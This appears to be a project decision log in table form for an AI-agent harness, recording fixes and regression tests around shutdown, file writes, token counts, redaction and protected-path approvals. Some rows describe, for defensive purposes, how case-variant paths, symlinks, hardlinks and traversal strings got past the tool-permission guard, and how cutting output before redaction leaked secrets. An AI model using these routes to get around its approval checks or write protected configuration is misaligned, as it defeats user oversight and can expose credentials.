| **Releasing the permission channel from `exit()` alone** | `TestACrashIsADismissalPathToo` | Batch 145 (S14-01). Review f10 installed the release on the funnel every DELIBERATE route out shares, and the involuntary route does not share it: textual's `_handle_exception` reaches `_fatal_error()` -> `_close_messages_no_wait()` and never calls `App.exit()`. Measured against a real App subclass mirroring this exit funnel -- a deliberate quit reached exit() and the unmount, an unhandled exception reached ONLY the unmount -- so a crash with a prompt open left a worker parked on `channel.get(timeout=600)` on a non-daemon executor thread that holds `App.run()`: a hang, not an error. `exit()` KEEPS its own copy of both lines, because removing them would leave the window between a quit and the unmount with no flag set, which is what the seven `ask_*_blocking` guards read; the release reads-and-clears, so `test_a_deliberate_quit_still_releases_exactly_once` pins that the second call is free |
| **Assuming `on_unmount` is early enough to release a worker** | `test_unmount_is_dispatched_before_the_worker_is_waited_for` | Batch 145, a DEPENDENCY pin in the shape of `TestShiftEnterIsStillNotTheKey`: the fact a decision rests on, not the feature. `App._shutdown` reads `await self._close_all()`, then `await self._close_messages()`, then `_dispatch_message(Unmount())` -- Unmount is THIRD. If either of the first two waited for the thread workers, a release at Unmount would be one the worker could never see: it waits for the release, the shutdown waits for it, and the park's 600s timeout breaks the tie. Measured on textual 8.2.8, the worker is released by the unmount and `App.run()` returns in 0.21s against a 3s park. A pin bump that reorders `_shutdown` fails here rather than turning the fix above back into the hang it replaced |
| **Testing `_shutting_down` in the callers and not in `_blocking_modal`** | `TestTheModalRetestsTheShutdownFlagItself` | Batch 145 (S14-03). TECHNICAL_DEBT 5 records the fix as "the flag consulted by both blocking ask paths", which closes the SEQUENTIAL re-arm that r1-1 was and leaves the one that is CONCURRENT with the release. The release is read-and-clear, so a release that runs while `_permission_channel` is still None puts nothing anywhere and the ask publishing a moment later parks on a queue with no writer left. `test_the_queue_was_published_before_the_guard_declined` is the half a return value cannot show -- a guard placed BEFORE the publication declines identically and leaves the race intact -- and it needs the recording `_permission_channel` setter in `_ChannelWatchingApp` to see it |
| **Installing modal state outside the `try` whose `finally` undoes it** | `TestTheModalLeavesNothingBehindWhenTheMarshalFails` | Batch 145 (S14-04). `call_from_thread` raises `RuntimeError("App is not running")` when textual's `_loop` is None, which teardown sets, and it sat between the two installations and the `try`. Measured on the real method with the marshal raising: `_permission_channel` LEFT SET and the turn clock STILL PAUSED. The clock is the half a user reads -- `tui/meters.py` explains the two pauses must not overlap, so every later turn's duration and `~tok/s` are wrong once the resume is lost, which is TECHNICAL_DEBT 9's misreading arriving by a new route in the batch 61 machinery written to stop it. `test_the_exception_still_propagates` pins that the fix did not become a swallow |
| **Leaving `_wait_for_sessions` reading only `sessions.closing`** | `TestTheSessionWaitEndsOnAQuit` | Batch 145 (S14-05). `closing` is set only by `SessionManager.close()`, reached from `main.py`'s `finally` -- which runs AFTER `run_tui()` returns, and `run_tui()` is `App.run()`, which does not return while this worker is alive. So the only thing that would have stopped the loop ran after the thing it was waiting on, and the second ctrl+c answered "Quit and stop what is running?" with a hang. The flag goes up on the THIRD wait, so the loop is already running when it changes -- a flag set before the first iteration would pass against a loop that reads it once. The stub raises `_StillSpinning` after 20 waits, which is what lets the control assert "it did not stop" without a thread and a sleep; the first cut used both and its spinning daemon threads starved the process measuring them |
| **Reordering the two teardown tests above the cancel branch** | `test_a_quit_does_not_promise_a_next_message` with `test_escape_still_says_the_results_are_held` | Batch 145 (S14-05/S14-06). A quit now sets the shutdown flag AND the cancel token, and the cancel branch posts "their results will arrive with your next message" -- true for escape, which is CN2's deliberate split, and false for a quit, where there is no next message. Whichever test runs first decides what the user is told, so the ORDER is the message and the pair pins both directions |
| **Stopping the chat drain on `_shutting_down` instead of cancelling the turn** | `TestAQuitStopsTheTurnItSaysItStops` | Batch 145 (S14-06), ruled by the owner, and it CORRECTS this file's own row recording `_consume` as deliberately untouched (see the #105 entry). The report's suggested shape was to give `_consume` the same shutdown test `_forwarding` has; measured on the real generator, a break lands on whatever event is next and one of those is `tool_call_start`, where D20 has already persisted the assistant turn carrying the `tool_use` and nothing has written the matching `tool_result` -- M4's pairing broken and an unresumable thread. Three runs: abandoning on `tool_result` orphaned nothing (that is what #42 fixed), abandoning on `tool_call_start` orphaned one, the cancel token orphaned nothing and ended the turn `cancelled`. SS61 had already answered this -- the token is tested BETWEEN tool groups and `_finish_cancelled` writes a row for every call it will not run. The flag is set BEFORE the cancel, pinned by `test_the_flag_is_set_before_the_cancel`, so a worker seeing the stop can already see the teardown |
| **Restoring the quitting line's "abandoned at its next event"** | `test_the_line_claims_a_boundary_rather_than_an_abandonment` | Batch 145 (S14-06). The sentence was written for `_forwarding`, which has that behaviour, and printed on every exit while `_busy` -- a flag covering a chat turn, a research run and `/compact` alike, as `_research_is_running`'s docstring says in those words. On a chat turn it asserted the opposite of what was being done with the user's API budget. It claims a BOUNDARY now, which is what a cooperative stop does: a tool call already running finishes (CN6) and every row the turn owes is written. The existing `test_quitting_while_busy_says_what_happens_to_the_work` asserts only that "quitting" appears, so it did not and could not see this |
| **Importing anything else from `core/` into `tui/widgets.py`** | the module docstring's amended rule | Batch 145. The rule said "nothing here imports core/" and now says nothing here reaches into harness state or does I/O, which is the part that was ever load-bearing. `core/ansi.py` is a pure text transform -- it imports `__future__` and nothing else, holds no state, touches no widget and does no I/O, which its own docstring says in those words -- and it lives in `core/` because the pty reader needs it too, not because it is machinery. A second copy in `tui/` is what the literal rule would have bought, and that is the two-copies-of-one-decision shape (EP6, #157) `core/ansi.py` itself refuses and batch 144 spent a whole surface undoing. Anything that reads config, storage, a session or a tool is still refused here |
| **Restating a redaction case in `test_tui.py` instead of reading the shared list** | `test_every_shared_redaction_case_is_redacted_here_too` | Batch 145, closing batch 144's rider. S07-09's finding is that one `sk-ant-` value between three tests pointed at one sink cannot discriminate; batch 144 added one test per missing vocabulary, which is a pilot and still a restated literal. A case added to `REDACTION_CASES` for the log file and for tool output did not reach this sink. The list is read now, in ONE pilot session for the whole of it -- the app is not what varies, the case is, and this file is already the suite's slowest |
| **Testing a delta ingress only on a span that crosses no commit boundary** | the `stream_delta committed` / `thinking_delta committed` rows in `INGRESS_PATHS`, with `test_the_committed_rows_really_bypass_emit` | Batch 145, found by the mutation pass. `_emit` MASKS the delta strip: a span that commits nothing hands its residual to `_close_answer` / `end_thinking`, which route it through `_emit`, so deleting the strip from `stream_delta` and from `thinking_delta` killed nothing out of 79 selected tests. The path that appends to `_entries` on its own -- `_write_stream_chunk`, `_write_thinking_chunk` -- had no test at all, which is S15-01's own "input that cannot discriminate" shape arriving in the tests written to close it. A trailing newline commits; the control asserts the span is OPEN with text recorded, because if a newline ever stopped committing those two rows would quietly become a third and fourth test of `_emit` |
| **Reading `AnsiStripper.feed()` without its `flush()` in a coverage sweep** | `test_the_whole_c1_range_goes_not_only_the_introducers` | Batch 145, found by the mutation pass. A change that routed a bare C1 into the CARRY instead of removing it passed against `feed` alone, because the character is absent from that return either way -- what the stream produces is both halves. Strengthening it immediately found that five of the sweep's own cases were malformed: `chr(0x9d) + "Zb"` opens an OSC and never closes it, so the carry holds it and `flush` releases it as text, which is the pty's stated contract and what the ESC spelling has done since batch 100. The cases carry a terminator now (`Z` is a CSI final byte, `\x9c` is ST, so one string terminates every shape) and that behaviour has its own test beside them |
| **Pinning `release_unterminated=False` through `flush` on the transcript path** | `test_a_runaway_sequence_is_dropped_rather_than_released` | Batch 145, found by the mutation pass. `_close_answer` DISCARDS what `flush` returns, so the flag is belt and braces at the end of a span and flipping the answer stripper back to the pty's default killed nothing. The flag's only observable the transcript reaches is the `_MAX_CARRY` overflow, which for the pty releases the held bytes into the output as text -- so that is what the test drives, and a sequence longer than the carry limit is the only way to reach it |
| **Letting the shape-row guard decline to run** | `test_the_shapes_are_all_still_in_the_list` | Batch 145, found by the mutation pass, and the gap is in BATCH 144's guard rather than this batch's. `test_the_shapes_are_what_discriminates` is parametrised over the rows whose labels are in `SHAPE_CASE_LABELS`, so dropping those rows from `REDACTION_CASES` left it with nothing to run: `1 skipped`, and the parity tests went on passing -- the exact vacuity it exists to prevent. `docs/TECHNICAL_DEBT.md` item 6's follow-up names this class: "where a test can decline to run, prove it runs." It covers a renamed label too, which empties the same parametrisation from the other side |
| **Removing the stripped-sequence record from `on_turn_finished`** | `TestTheStrippedSequencesAreRecordedOnce` | Batch 145, found by the mutation pass: nothing tested `tui/app.py`'s half of the logging ruling, so a control that stopped reading the count survived. Three directions, because the ruling has three parts -- the record exists and names a number, a clean turn says nothing (a line per turn regardless is a line nobody can read anything from), and the count does not carry into the next turn, which is what read-and-clear is for. INFO, so it reaches `logs/app.log` at the default level and NOT the transcript, since `TranscriptLogHandler` is WARNING+ |
| **Registering a gate that is not total over a JSON object** | `TestTheGatesAreTotalOverWhateverTheModelEmitted` (`tests/test_tool_arguments.py`) | Batch 146, the merged S03/S04 finding. `approval_check` and `refusal_check` run ABOVE dispatch()'s handler containment, and `core/loop.py` calls both with no `try` -- the `try` around `dispatch` catches only `ToolCallDenied`. `file_ops`' two gates read `params.get("path", "")` with no type guard, and a `{"path": null}` is a well-formed object, so `os.path.join(WORKSPACE_ROOT, None)` raised a TypeError out of the registry: a lost turn alone, a durable `status='failed'` in a research pass, one call's error result in a parallel batch. The relation sweeps every statically registered tool x every declared property x six wrong-typed values, plus params that are not a dict, and asserts the ANSWER'S TYPE -- a predicate returning None would satisfy "did not raise" and read as "no approval needed". A LOOP rather than a `@parametrize`, because the argument list would be a comprehension over the registry and batch 145 met that emptying for real |
| **Rendering a ValidationError with `str(e)` in a refusal** | `test_the_refusal_does_not_echo_the_value_it_rejected` | Batch 146. `invalid_params` (`tools/base.py`) renders `err['loc']` and `err['msg']` and nothing else, and the one line `str(e)` would have been is the reason this has a test: pydantic's own rendering carries `input_value`, and the refusal path returns its reason as the result DIRECTLY -- the one result path that does not pass `check_output_policy`. So a refusal built the obvious way is a sink the output scanner never sees. `shell_sessions` chose this shape first and now shares the renderer rather than keeping a second copy |
| **Answering the arguments before the hard deny** | `TestProtectedSegmentDenial::test_the_refusal_check_answers_pre_approval` | Batch 146, and two pre-existing tests are what caught it. The first draft validated the whole model first, so `write` with a protected path and no `content` answered "content: Field required" and never mentioned the deny -- which is the mistake §32 A7 exists to prevent, one layer over: supplying the content would only earn the refusal on the next turn. The order is the path's TYPE, then the deny, then everything else, and the deny half of this test deliberately passes nothing but a path, which for `write` and `edit` is an incomplete call |
| **Driving a refusal control with arguments that are not complete** | `_REST_OF_THE_CALL` (`tests/test_file_ops.py`) | Batch 146. Both "a path with no protected segment is not refused" controls used `{"path": "notes.txt"}` for all three tools, which is a complete call for `read` and not for `write` or `edit`. Harmless while the refusal answered the path alone; the moment it also answered the arguments, the control stopped being a control and started asserting that a missing `content` is acceptable |
| **Opening a write path with mode "w" and no `newline=`** | `TestTheBytesWrittenAreTheBytesSupplied`, `TestTheDocumentGetsTheBytesItWasGiven` | Batch 146 (S04-02). `newline=None` translates every "\n" to `os.linesep`, so on Windows `write` could not reproduce bytes it had just read and `edit` replacing one span of an LF file rewrote EVERY line ending in it -- 2,988 of them in this repository's own AGENTS.md -- while the diff the user approved showed one line. The assertions are on BYTES, and a MIXED file is in the table because this repository has one (`docs/DEVLOG.md`) and it is the case that distinguishes "writes what it was handed" from "writes the file's dominant ending" |
| **Giving `edit` a byte-exact write without a byte-exact read** | `test_edit_moves_only_the_span_it_was_asked_to_move`, `test_a_multi_line_span_still_matches_a_crlf_file` | Batch 146, and THE REPORT'S SUGGESTED FIX WAS THIS. It said `newline=""` on the three writes alone would leave `edit` "preserving whatever the file already had"; driven, it does the opposite -- the read used universal newlines, so `content` was LF in memory whatever the file held, and writing that back converted a CRLF file to LF. That broke a case which was CORRECT before the fix. The read moved too, and the LF-spelled retry exists because `read` joins its lines with "\n" whatever it found, so a span the model spells from what it was SHOWN can never match a CRLF file by bytes |
| **Counting the lines a read CHOSE rather than the ones it returned** | `TestTheCountIsWhatWasReturned` | Batch 146 (S04-03). `lines_returned` came from the selection and the character cut discarded most of it afterwards: 500 reported, 313 delivered, and the clamp branch's own message said "Use offset=500 to read further" -- 187 lines and 29,920 characters reachable by no call the model could construct. The cut is at a LINE boundary now, because `offset` and `count` are in lines, and the two branches name ONE resume point. The tests use many WIDE lines on purpose: the guard that should have caught this writes a SINGLE line, so `lines_returned` is 1 and no count can be wrong whatever the cut does |
| **Delivering nothing when one line exceeds the whole ceiling** | `test_a_line_longer_than_the_whole_ceiling_is_still_delivered` | Batch 146, and the case the report's suggested shape does not mention. Accumulating whole lines while they fit keeps ZERO lines for a minified file, so the tool would return empty content and the model would have nowhere to go. The line is cut and the message says that resuming skips the rest of it -- the one place this tool loses data by design, stated rather than left to be discovered, because its paging unit is a line |
| **Comparing a protected path segment with exact case** | `TestTheProtectedSegmentIsCaseFolded`, `TestTheReadDenylistFoldsCaseToo`, `TestProtectedSegmentsAlwaysAsk::test_a_case_spelled_reference_is_caught_too` | Batch 146 (S04-04). `realpath` only canonicalises a spelling for a path that ALREADY EXISTS, which is not the state a `write` is in: `.VENASTINE/mcp.json` resolved to itself, carried no known segment, was auto-approved, and created the protected directory under the spelling the guard did not know -- after which realpath canonicalised to the ON-DISK name and BOTH spellings were admitted in that project permanently. One fold, in `protected_paths.folded_segments`, read by all three consumers. The owner ruled it unconditional rather than per-platform, which costs a hard DENY for a directory genuinely named `.VENASTINE` on a case-sensitive filesystem |
| **Testing the shell's segment check through a path that resolves** | `test_only_the_raw_branch_can_answer_a_cancelled_traversal` | Batch 146, found by the mutation pass. `_command_touches_protected` has TWO branches -- the raw token and the realpath of it -- and `cat .VENASTINE/settings.json` is answered by the second, because with no such directory on disk realpath returns the path unchanged and the folded segment is still in it. So a control reverting the RAW branch to an exact-case compare survived. A traversal that CANCELS the segment (`.VENASTINE/../notes.txt`) resolves to a path with nothing to find, so only the raw branch can answer -- and the test asserts that the resolved branch finds nothing, rather than leaving the isolation in a docstring |
| **Writing a document without resolving its destination** | `TestTheWriteResolvesBeforeItWrites` | Batch 146 (S17-01). `project_docs.write_run` joined the allowlisted name onto the project root and opened it, while `read_run` in the same module had always resolved before deciding -- so a document name that is a LINK wrote outside the project, under a consent that `approval_notice` rendered from the unresolved join. git stores symlinks natively, so `ARCHITECTURE.md -> ~/.bashrc` in a cloned project needs no privilege to arrive. The link arm runs as a symlink under WSL and as a junction here |
| **Closing a link-out with resolution alone** | `test_a_hardlinked_document_name_is_replaced_not_followed`, `TestAHardlinkCannotReachTheProtectedFile` | Batch 146, and the measurement that changed the fix. S17-01's suggested shape is "resolve the destination", and its own probe demonstrated the harm through a HARDLINK -- which that shape ADMITS, because `os.path.realpath` returns the path it was given and `islink` is False. The same hole reached `file_ops`: a `write` through a hardlinked name put an `mcpServers` object into a protected `settings.json` whose direct spelling is refused, which no report names. `json_store.write_text_atomic` replaces the name instead, so the link breaks and the other name keeps its bytes. The tests assert on the PROTECTED FILE'S BYTES rather than on the tool's answer, because the refusal still says None and that is the honest state -- `docs/TECHNICAL_DEBT.md` 90 carries the read half |
| **Injecting a write failure at `builtins.open`** | `_fail_write_of` (`tests/test_project_init.py`) | Batch 146. The helper hooks the open and matches the document's basename, and its docstring argues for that level: "so the whole chain runs ... Patching higher up would test the handler against a failure shape the handler was already written for." The argument is right and the hook was in the wrong place once the bytes went through `os.open` into `<name>.<hex>.tmp`: FIVE consent tests went green because the failure they inject no longer happened. It covers both opens and the temp name now |
| **Giving `json_store` a second copy of the temp-and-replace dance** | `write_text_atomic` over `_replace_through_temp` | Batch 146. This module exists because four JSON stores each had a copy of the write and the copies had drifted -- one of them, holding a record of CONSENT, wrote with a bare `open(path, "w")` and said nothing. The file tools' text write is the fifth consumer, so the mechanics moved into one private helper rather than being copied a fifth time. The one thing the callers disagree about is translation, which is why `newline` is a parameter: the JSON stores' bytes on disk were written through `newline=None` and rewriting four user-tier stores to no end is worse than the inconsistency |
| **Restating why a tool handler validates its params** | `test_no_production_module_restates_why_a_handler_validates`, `test_the_one_copy_is_where_the_relation_says_it_is` | Batch 146 (S04-06). Six modules in `tools/builtin/` justified `params.get` with the same mechanism and cited each other as the authority -- and the mechanism was false: `dispatch()` contains a handler's exception "on purpose". Five were in the present tense and wrong; load_skill's is an account of what happened and every clause of it is true. What none of them said is the half that was live in their own surface: a GATE's raise is not contained. The one copy is `tools/base.py`'s "WHAT A CALLABLE REGISTERED BELOW MAY RAISE" block, the relation stops a seventh copy, and the guard on the guard requires the block to exist, to say BOTH halves, and to be cited -- because "nobody restated it" is also true of an empty tree |
| **Letting an unknown tool name out of `_dispatch_one`** | `TestTheLoopContainsAnUnknownToolName` | Batch 147 (S10-03). `registry.dispatch` raises `ValueError` for a name it does not hold, deliberately, and the loop caught only `ToolCallDenied` -- so a name the MODEL invented ended the turn, stamped the thread `turn_failed`, and recorded `status='failed'` in a research pass. The durable half is worse than the turn: D20 has already persisted the `tool_use` block, nothing writes a `tool_result`, and M4's pairing is broken with nothing that repairs it. The specificity is `registry.is_registered` asked on the exception path, so a ValueError from the approval machinery still ends the turn -- which is its own test, because a bare `except Exception` here would be invisible and would stop `dispatch()` being the fail-closed backstop it is documented as |
| **Testing the unknown-tool containment through `_dispatch_parallel`** | `test_an_unknown_name_can_never_reach_the_parallel_backstop` | Batch 147. The NA14 comment said the parallel backstop caught "an unknown tool's ValueError", and it could not: `registry.parallel()` answers False for a name it does not hold, so an unknown call is always a group of ONE and a group of one takes the sequential branch. A guard written against that comment would have passed against the wrong function. The test asserts BOTH partitions -- the unknown name alone, and the same two siblings grouping when it is moved out from between them -- because the first assertion alone also passes if the partitioner refuses to group anything |
| **Reading a provider's token count with `getattr(obj, field, 0)`** | `TestACountThatIsPresentAndNotANumber`, `test_the_GOOGLE_usage_read_against_a_REAL_nullable_usage_object` | Batch 147 (S10-04). The default never fires: on the pinned `google-genai` every usage field is `Optional[int] = None` and a bare usage object is TRUTHY, so `if usage_meta:` passed and both reads returned None. D21's guard compares `== 0`, `None != 0`, so the stream that reported nothing did not raise -- and the loop's `usage_in + usage_out` raised a `TypeError` three layers from the cause instead. Every existing D21 test omits the usage object entirely, which is the one shape for which the default DOES fire, so the suite could not see it. The new tests give the object and leave one field out |
| **Exempting the ANTHROPIC or OPENAI branch because the field is annotated `int`** | `test_a_required_int_is_not_a_runtime_guarantee_on_either_other_SDK`, `test_the_anthropic_accumulator_treats_its_own_int_field_as_nullable` | Batch 147, and the audit the report asked for rather than a finding it made. `anthropic.types.Usage.input_tokens` and `openai.types.CompletionUsage.prompt_tokens` are `int` and REQUIRED, and both SDKs parse wire JSON with pydantic's `construct`, which skips validation -- so the annotation says what the server promises, not what the object holds. Measured: `construct_type({"output_tokens": 7}, Usage)` yields `input_tokens=None`, and anthropic's own stream accumulator guards `input_tokens` with `is not None` against that same annotation while assigning `output_tokens` unconditionally. That is why the fix is one reader for three branches |
| **Widening D21 to refuse a partial usage report** | `test_google_raises_and_names_the_missing_count`, `test_the_two_messages_stay_distinguishable`, `test_a_reported_zero_is_a_number_and_passes` | Batch 147, ruled by the owner as §64's A20 -- a BEHAVIOUR change for any provider with the flag set, which `providers.json.example` ships true for ANTHROPIC, OPENAI and QWEN_TOKEN_PLAN. Under the flag a count that is not a number now raises at the producer, where before it either poisoned the arithmetic or passed as a zero. It cannot break a case that works today -- every input it raises on currently dies with a `TypeError` in the loop -- and the nothing-at-all wording is kept VERBATIM so the two guards matching on it keep their meaning. An explicit zero is still a count, which is the control: it is only `input == 0 AND output == 0` that D21 has ever refused |
| **Binding Ctrl+C to the wake turn, or leaving it bound to nothing** | `TestCtrlCDuringAWakeTurn` | Batch 147 (S10-05), ruled as §64's A21 AGAINST this batch's own recommendation. CN10's handler is restored in `run_chat`'s `finally` before `_await_sessions` is called, so during a wake turn the default handler was live and Ctrl+C unwound a model turn from wherever it landed -- `_run`'s frame catches `Exception`, not `BaseException`. The key must NOT stop the turn: a press aimed at copying or pasting cannot be allowed to end one, which is what the TUI measured in batch 57 ("ctrl+c copies when there is something to copy, and starts a quit when there is not"). So `_await_sessions` installs a handler that DEFERS the press and the sessions stop after the turn. The third test is about the handler's EXTENT, which is the whole fix: too long and it swallows the interrupt belonging to the WAIT, too short and it is the defect -- and it asserts against the handler in force outside the turn, so it cannot pass by both being the same thing |
| **Asserting a translated GOOGLE schema against a dict** | `test_tools_google_wraps_in_function_declarations` | Batch 147 (S10-07). `parameters == {"type": "object"}` is true of the root conftest's fake, which stores whatever dict it is handed, and FALSE of the real `FunctionDeclaration` for every input: it builds a `types.Schema` whose `.type` is the enum `Type.OBJECT`. So the assertion encoded a model of the field no version of the SDK has had. It was also the one input that could not discriminate -- `{"type": "object"}` is a fixed point of `_reduce_for_google`, so no reduction, however broken, could have failed it. The claim is now about the dict production HANDS OVER, over an input the reduction must change, and what the real SDK makes of it is asked in `test_sdk_conformance.py` |
| **Proving a per-branch usage read with a count of `None`** | `test_anthropic_is_not_exempt_despite_an_int_annotation`, `test_openai_is_not_exempt_either` | Batch 147, found by the mutation pass. Reverting EITHER branch's read to `getattr(obj, field, 0)` left both tests green, because None is None wherever it is read and `_stream_usage` catches it either way: the tests proved the COMPOSITION and not the branch. The discriminating value is present, not a number, and not None -- a bool is an `int` instance in Python, so `getattr` hands `True` through as a token count while `_token_count` rejects it. Both arms are kept, because the None arm is the REACHABLE case and the bool arm is the one that isolates the read. The same gap in the other direction is why C2's control had to be retargeted: removing the deferred-press branch HANGS `test_session_cli.py` rather than failing it, since that branch is the wait loop's only exit once a press has landed and a session is still live |
| **Testing the `all-pinned` branch on the strategy rather than on the segment** | `TestTheAllPinnedDoorIsOpenToBothStrategies` | Batch 148 (S11-02). `if not segment and not chaining:` let the SHIPPED strategy fall through the one branch built for the state it had reached: `chain` prepends the previous summary to the segment, so an EMPTY segment makes the compactor's whole input its own last answer. Measured through the real `compact()` -- a 2,489-character checkpoint came back as 23, reported as `status="folded"`, "0 earlier messages compacted into a summary". Four assertions and two controls, because three of the four also pass against a branch that refuses every chained fold: `test_the_premise_is_an_empty_segment_and_the_test_asserts_it` pins the thread shape the class depends on (the watermark advanced AND the new span is empty), and `test_an_ordinary_chained_fold_still_happens` is the case the fix must not have broken |
| **A trigger above the window that says nothing** | `TestASmallWindowSaysThatItCannotCompact` | Batch 148 (S11-03), ruled as §65's A24. The dependent floor is applied with no reference to the window, so at or below 8,000 the trigger is above it and `used` can never reach it. The first test sweeps EVERY value a 4,096-window provider could report, because `warn_at` collapses to 1 down there -- a test probing one point sees `warn` and reads as covered, which is what the existing `TestTheDerivedTriggerStaysAboveWhatTheValidatorsDemand` does. The parametrized control is A24's ruling in a test: 16,384 and 32,768 leave less headroom than one bounded read too, and must stay SILENT, because the headroom cap bound them and the two settings the line names are not the remedy there (TECHNICAL_DEBT 96). `compaction._floor_warned` is module state and the autouse fixture clears it for `_context_window_warned`'s reason |
| **The pipeline backstop as a number instead of an order** | `TestTheBackstopStaysAboveTheWorkingSetTrigger` | Batch 148 (S11-04). A flat 20,000-token margin against a clamped-share trigger made the backstop fire EARLIER at every window below 200,000, inverting M6, and at or below 20,001 `max(1, ...)` clamped it to 1 so every evaluation of every pass asked `compact()`. The sweep includes the windows a PROVIDER reports, which is the only way in: the shipped table's entries are all at or above 200,000, where the two numbers were equal or already ordered, so `test_the_shipped_roster_is_unmoved_except_at_the_boundary` states that in both directions -- it is the one test that would notice if the fix had quietly replaced the margin everywhere, and it names `claude-haiku-4-5` as the single entry that moves, by one token |
| **Measuring #89's pin cap against the configured trigger** | `TestThePinCapIsAFractionOfTheTriggerThatFires`, plus two tests in `test_session_overrides.py` | Batch 148 (S11-06), ruled as §65's A22. The cap is a fraction OF THE TRIGGER and batch 44 moved the trigger off the constant the cap kept reading, so it was 20,000 for every model: 250% of the firing trigger at 8,192, where one pin could floor the thread permanently above it, and 8% at 262,144. `pin_measurements` takes an optional `(model, provider_name)`; `test_another_pairs_override_does_not_reach_this_cap` is the control that distinguishes the resolution from `trigger_any()`, which answers with whatever was set for ANY pair. **A raised session `/trigger` now RAISES the cap** when the pair is in scope, because a raised override IS the trigger that fires; the no-pair call still errs strict, and both are asserted |
| **A `pin` handler that does not declare `parent_run`** | `test_a_tool_without_the_parameter_is_not_given_one`, `test_the_cap_is_measured_against_the_pair_the_run_carries` | Batch 148. The injection is opt-in by signature, so a declared parameter nothing passes and a passed value nothing declares both fail silently: the cap would read the configured trigger forever and every unit test of `pin_measurements` would still pass. The first test pins the injection SET (`("parent_run", "memory")`, in `_INJECTABLE_PARAMS` order) and the second asserts the values arrive at the seam. `test_no_run_in_scope_is_not_an_error` is the other half -- `pin` is callable from places with no RunInfo, and a None pair must reach `pin_measurements` as None rather than raising on the way |
| **Cutting a session's output before redacting it, at any of the four sites** | `TestTheWakesPerSessionBudgetCutsRedactedText`, `TestTheSessionViewsDisplayBudgetCutsRedactedText` (both in `test_redact_before_cut.py`), `TestASessionsOutputIsRedactedBeforeItIsCut` (in `test_shell_sessions.py`) | Batch 148 (S11-05), ruled as §65's A23. RB1's ordering, one tool over: the producer's tail cut, the wake's per-session division, the view's display budget and `shell_output`'s paging each took their slice first and handed it to the policy after, and a pattern only matches what it can see whole. Swept at every interior cut position over all ten patterns, with the vacuity control the file demands beside each sweep -- and the filler is whole LINES, because a run of one character leaves no word boundary before `password` and makes a sweep report clean rows for a secret the redactor never matched at all (this batch's first probe did exactly that, and `_straddling`'s docstring already warned about it). The paging route is the severe one: all seven shapes leak there, including the fixed-length vendor tokens, because the model asks for the adjacent page itself |
| **`OutputBuffer.page` redacting per page, or per part** | `test_a_redactor_sees_the_parts_before_a_page_is_cut_from_them`, `test_the_dropped_middle_is_still_stated_in_a_redacted_page` | Batch 148. `clean` is applied to the PARTS and the parts are JOINED when nothing has been evicted, because the head/tail seam is a cut too and it sits at 10,000 characters on every session -- inside the first page of every read. With a dropped middle the parts are redacted separately, since nothing can rejoin a pattern whose middle the process never kept (TECHNICAL_DEBT 95), and the gap's own size stays in RAW characters while the offsets around it describe the redacted text (RB3). The second test is the arithmetic: `total_chars` moves with the redaction and the gap does not |
| **Reporting "earlier output omitted" because redaction shortened the text** | `test_redaction_alone_is_not_reported_as_omitted_output`, `test_a_tail_the_budget_really_did_cut_still_says_so` | Batch 148, fixed for free by computing the flag on the redacted side of the cut. `len(event.output_tail) > len(clean["output_tail"])` was true whenever any value was redacted -- 30 characters for one `ghp_` token -- and that sentence is the only thing telling a reader whether to call `shell_output`, so a false one costs a tool call and a wrong belief about what the session wrote. The control is the other direction: a fix that always reported False would pass the first test and lose the one notice a reader acts on |
| **Handing `live_entries` a pre-cut tail** | `TestTheSessionViewsDisplayBudgetCutsRedactedText`, `test_the_budget_still_bounds_what_is_drawn` | Batch 148. The painter now passes `buffer.last()` -- everything the buffer holds -- and the cut moved into `live_entries`, below the redaction. The control matters more than usual here: a "fix" that stopped cutting would pass every leak assertion in the class and paint a 200,000-character buffer into the pane one line at a time, so the budget is asserted as a bound AND as having drawn something |
| **Restoring the root logger's handlers but not its LEVEL** | `test_configure_logging_sets_the_root_level` + `test_and_the_root_level_does_not_outlive_that_test` (an ordered pair) | Batch 148, found by this batch's own full-suite run and not by any report. `configure_logging()` calls `root.setLevel(INFO)`; `test_logging_setup.py`'s `_clean_root` restored the HANDLERS only, one word short of its own rule ("handlers are global state -- leaving one attached leaks into every later test in the session"). The root level decides whether an INFO record reaches pytest's capturing handler at all, so the leak reaches every later assertion of the form "nothing was logged": `tests/test_tui.py::TestTheStrippedSequencesAreRecordedOnce::test_the_count_does_not_carry_into_the_next_turn` failed in the full-suite run because 105 new tests changed the xdist distribution and put the two files on one worker, and it reproduces in 3.5 seconds with the two files alone under `-n0`. **Not register item 85**: that one is an unreproduced worker-thread race, this is an ordinary order dependency with a deterministic reproduction. The fixture lives in `conftest.py` because five test files call `configure_logging` and the leak belongs to the call |
| **Typing a pass field's container and not what the container holds** | `TestTheMembersAreDeclaredToo` | Batch 149 (S12-01), ruled as §66's A25. The report's own suggested shape says "presence plus container type closes the crash"; measured, with `entities` a LIST, `["madrid", 1947]` still raises in Pass 3a's `sorted({...})` and `[["madrid"]]` raises on the hash. Three of six crash shapes survive a container-only check, and the pure code that crashes makes no model call, so there is nothing to retry with |
| **Accepting a boolean where a spec declares `NUMBER`** | `TestABooleanIsNotANumber` | Batch 149 (S12-01). `isinstance(True, int)` is True, so `"severity": true` passed the boundary and Pass 5 computed `1.0 - True` = 0.0 — the MAXIMUM critic penalty, with no trace line and no corrective retry; `false` took the other extreme. `_of_type` applies the exclusion to every declared type, not to NUMBER alone, because "a boolean satisfies a type it was not declared as" is the defect. The controls pin 0, 1, 0.0 and 1.0 as still valid |
| **Declaring a member type for something nothing reads** | `test_a_flag_LIST_is_checked_and_the_strings_in_it_are_not`, `test_and_pass_3cs_gaps_members_are_not_checked_either` | Batch 149. Both are CONTROLS rather than guards: B4's rule is that a check earns its place by having a demonstrated consequence, and `len()` is the only reader of a flag list while `build_coverage_gap_entries` wraps each gap without reading it. A widening now has to argue with a test instead of drifting in. Same reason `source_span` got no type, although S12-01's suggested shape asks for one |
| **Validating Pass 6b's payload against every claim id in the run** | `test_a_pass_6b_response_naming_NOTHING_in_the_batch_is_corrected` | Batch 149 (S12-02), ruled as §66's A26. 6b is asked about `flagged` and was validated against `run.claims`, so a response about any id in the run was accepted. Narrowed to match 6a, which makes an all-wrong response a corrective retry. **This is the batch's one behaviour change**: a payload naming nothing in the batch used to finish a run |
